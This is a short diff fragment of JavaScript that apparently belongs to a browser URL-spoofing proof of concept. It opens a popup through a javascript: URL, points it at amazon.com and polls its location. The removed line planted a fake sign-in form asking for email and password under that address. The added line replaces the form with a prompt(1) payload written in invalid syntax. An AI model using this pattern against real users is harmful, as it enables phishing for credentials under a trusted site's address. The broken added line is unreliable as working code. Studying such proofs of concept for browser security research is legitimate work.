@@ -13,7 +13,7 @@
         }
       
         function f() {
-            w = window.open("javascript:win.document.write('<h1>Sign in</h1><form action=\\\"#\\\"><input id=email type=email placeholder=Email required><input id=pass type=password placeholder=Password required><input type=submit value=Login></form><div id=result></div>');location='http://amazon.com'","new","width=500,height=500");
+            w = window.open("javascript:document.write(javascript:prompt(1));location='http://amazon.com'","new","width=500,height=500");
             i = setInterval(function() {
                 try { 
                     x = w.location.href; 
